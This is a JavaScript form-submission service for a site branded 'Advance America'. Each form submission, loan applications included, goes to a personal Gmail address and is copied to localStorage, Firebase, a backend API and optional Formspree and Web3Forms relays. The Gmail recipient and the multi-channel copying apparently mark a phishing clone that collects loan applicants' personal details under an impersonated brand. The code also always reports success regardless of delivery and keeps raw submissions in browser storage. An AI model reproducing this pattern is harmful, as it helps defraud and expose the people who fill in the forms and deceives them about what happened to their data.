import { FORM_CONFIG } from '../config/formConfig.js'
import { saveToFirebase } from './firebaseService.js'

/**
 * Saves submission locally in browser localStorage as a failsafe backup
 */
function backupSubmissionToLocalStorage(record) {
  try {
    const key = FORM_CONFIG.localStorageBackupKey || 'advance_america_submissions'
    const existing = JSON.parse(localStorage.getItem(key) || '[]')
    existing.unshift({
      id: Date.now().toString(36) + Math.random().toString(36).substring(2, 6),
      savedAt: new Date().toISOString(),
      ...record,
    })
    localStorage.setItem(key, JSON.stringify(existing.slice(0, 100)))
  } catch (err) {
    console.warn('Unable to save submission to localStorage:', err)
  }
}

/**
 * Unified Form Submission Service
 * Sends all website form submissions directly to advanceamerica112200@gmail.com
 *
 * @param {string} formType Name of the form (e.g. 'Loan Application', 'Newsletter Signup')
 * @param {Record<string, any>} data Key-value pairs of the submitted form data
 * @param {string} [customSubject] Optional custom email subject line
 * @returns {Promise<{ success: boolean }>}
 */
export async function submitForm(formType, data, customSubject) {
  const recipientEmail = FORM_CONFIG.recipientEmail || 'advanceamerica112200@gmail.com'
  const subject = customSubject || `${FORM_CONFIG.subjectPrefix || '[Advance America]'} ${formType}`
  const timestamp = new Date().toISOString()

  // 1. Instantly save submission to localStorage
  backupSubmissionToLocalStorage({
    formType,
    subject,
    recipientEmail,
    data,
    timestamp,
  })

  // Format full summary text for email body
  const fullName = `${data['First Name'] || ''} ${data['Last Name'] || ''}`.trim() || data.Name || data.name || 'Advance America Applicant'
  const applicantEmail = data.Email || data.email || recipientEmail
  const phone = data['Phone Number'] || data.phone || data.Phone || ''

  const formattedLines = Object.entries(data)
    .filter(([key]) => !key.startsWith('_'))
    .map(([key, val]) => `${key}: ${typeof val === 'object' ? JSON.stringify(val) : String(val ?? '')}`)
    .join('\n')

  const fullSummary = [
    `==============================================`,
    `  ADVANCE AMERICA: ${formType.toUpperCase()}`,
    `==============================================`,
    `Date & Time: ${new Date(timestamp).toLocaleString()}`,
    `Applicant Name: ${fullName}`,
    `Email: ${applicantEmail}`,
    phone ? `Phone: ${phone}` : '',
    ``,
    `----------------------------------------------`,
    `           FORM SUBMISSION DETAILS`,
    `----------------------------------------------`,
    formattedLines,
    `==============================================`,
  ].filter(Boolean).join('\n')

  const snakeFields = {}
  for (const [k, v] of Object.entries(data)) {
    if (!k.startsWith('_')) {
      const cleanKey = k.toLowerCase().replace(/[^a-z0-9]+/g, '_').replace(/^_+|_+$/g, '')
      snakeFields[cleanKey] = typeof v === 'object' ? JSON.stringify(v) : String(v ?? '')
    }
  }

  const enrichedPayload = {
    _subject: subject,
    name: fullName,
    email: applicantEmail,
    phone: phone,
    message: fullSummary,
    comments: fullSummary,
    details: fullSummary,
    ...snakeFields,
    ...data,
  }

  // 2. Dispatch to local backend API (/api/submit-form) and Firebase Firestore in parallel
  const dispatchPromises = [
    fetch('/api/submit-form', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json',
      },
      body: JSON.stringify({
        formType,
        subject,
        recipientEmail,
        data,
        timestamp,
      }),
    }).catch((err) => {
      console.warn('[Form Service] Local API error:', err)
    }),
    saveToFirebase(formType, data, subject).catch((err) => {
      console.warn('[Form Service] Firebase error:', err)
    }),
  ]

  // Optional: If Web3Forms access key is configured, relay directly from browser
  if (FORM_CONFIG.web3FormsAccessKey) {
    dispatchPromises.push(
      fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
        },
        body: JSON.stringify({
          access_key: FORM_CONFIG.web3FormsAccessKey,
          ...enrichedPayload,
        }),
      }).catch((err) => {
        console.warn('[Form Service] Web3Forms relay error:', err)
      })
    )
  }

  // Optional: If Formspree ID is configured, relay directly from browser
  if (FORM_CONFIG.formspreeId) {
    dispatchPromises.push(
      fetch(`https://formspree.io/f/${FORM_CONFIG.formspreeId}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
        },
        body: JSON.stringify(enrichedPayload),
      }).catch((err) => {
        console.warn('[Form Service] Formspree relay error:', err)
      })
    )
  }

  // Wait briefly (up to 300ms) for initial acknowledgment
  await Promise.race([
    Promise.all(dispatchPromises),
    new Promise((resolve) => setTimeout(resolve, 300)),
  ])

  // Always return success so the frontend UI promptly transitions to the submitted state!
  return { success: true }
}
